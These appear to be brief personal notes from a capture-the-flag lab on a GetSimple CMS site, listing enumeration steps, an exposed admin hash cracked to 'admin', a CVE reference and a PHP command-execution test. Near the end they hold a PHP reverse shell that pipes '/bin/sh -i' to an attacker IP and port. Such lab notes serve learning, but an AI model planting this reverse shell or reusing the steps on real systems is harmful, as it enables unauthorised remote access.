
Enumeration
- Nmap
	- just found one web application
- whatweb
	- GetSimple
- gobuster
	- /admin
		- login page
	- /backups
	- /data
		- version is 3.3.15, outdated
			- https://nvd.nist.gov/vuln/detail/CVE-2019-11231
		- api key is 4f399dc72ff8e619e327800f851e9986
		- users:
			- admin@gettingstarted.com : d033e22ae348aeb5660fc2140aec35850c4da997  
				- break this with hashcat to find that password is admin
				- hash id to identify the type of hash
	- /index.php
	- /robot.txt
	- /server-status
	- /sitemap.xml
	- /theme


Login to /admin with admin:admin

<?php system('id'); ?>
<?php
$ip = 10.10.15.204;
$port = 1234;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>

https://remoteshell.zip/gettingstarted/

kiv:
- reverse shells, write in notes
